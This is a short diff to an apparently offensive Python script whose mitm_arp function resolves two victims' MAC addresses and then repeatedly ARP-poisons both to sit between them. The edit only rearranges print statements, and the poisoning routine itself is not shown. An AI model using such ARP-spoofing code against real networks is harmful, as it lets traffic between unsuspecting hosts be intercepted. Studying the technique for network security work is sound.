@@ -54,11 +54,13 @@ def mitm_arp(victim_1_ip, victim_2_ip, interface):
         # Tis way we don't continuously ask for the MAC adress, which are relativily static anyway
         print(f'finding victim mac addresses on {interface}')
         victim_1_mac = get_target_mac(victim_1_ip, interface)
-        print(f'The mac address of the first victim: {victim_1_mac}')
         victim_2_mac = get_target_mac(victim_2_ip, interface)
+        print(f'The mac address of the first victim: {victim_1_mac}')
         print(f'The mac address of the second victim: {victim_2_mac}')
 
         while True:
+            print(f'The mac address of the first victim: {victim_1_mac}')
+            print(f'The mac address of the second victim: {victim_2_mac}')
             poison(victim_1_ip, victim_2_ip, victim_1_mac, interface)
             poison(victim_2_ip, victim_1_ip, victim_2_mac, interface)
             sleep(2)
